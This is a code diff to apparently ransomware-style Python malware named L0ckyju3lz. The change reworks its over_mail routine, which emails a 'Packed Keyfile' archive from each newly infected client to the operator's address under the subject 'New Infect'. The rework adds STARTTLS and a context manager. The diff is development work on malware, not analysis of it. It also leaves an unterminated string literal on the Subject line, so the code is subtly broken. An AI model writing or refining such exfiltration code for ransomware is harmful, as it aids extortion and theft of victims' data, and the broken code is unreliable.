@@ -42,7 +42,6 @@ class L0ckyju3lz():
         # SMTP
         self.host = ""
         self.port = ""
-        self.src_address = ""
         self.username = ""
         self.password = ""
 
@@ -107,22 +106,21 @@ class L0ckyju3lz():
 
     def over_mail(self):
         try:
-            s = smtplib.SMTP(host=self.host, port=self.port, source_address=self.src_address)
-            s.connect()
-            s.login(user=self.username, password=self.password)
+            with smtplib.SMTP(host=self.host, port=self.port) as s:
+                s.starttls()
+                s.login(user=self.username, password=self.password)
 
-            msg = MIMEMultipart()
-            msg["Subject"] = "L0ckerju3lz - New Infect
-            msg["From"] = "l0ckerju3lz@" + self.client_ID
-            msg["To"] = self.response_mail
-            text = MIMEText("Attachment: Packed Keyfile from Client " + self.client_ID)
-            msg.attach(text)
-            with open(self.archiv_name, 'rb') as f:
-                file_data = MIMEApplication(f.read())
-            msg.attach(file_data)
+                msg = MIMEMultipart()
+                msg["Subject"] = "L0ckerju3lz - New Infect
+                msg["From"] = "l0ckerju3lz@" + self.client_ID
+                msg["To"] = self.response_mail
+                text = MIMEText("Attachment: Packed Keyfile from Client: " + self.client_ID)
+                msg.attach(text)
+                with open(self.archiv_name, 'rb') as f:
+                    file_data = MIMEApplication(f.read())
+                msg.attach(file_data)
 
-            s.sendmail(from_addr=msg["From"], to_addrs=msg["To"], msg=msg)
-            s.quit()
+                s.sendmail(from_addr=msg["From"], to_addrs=msg["To"], msg=msg)
             return True
         except:
             return False
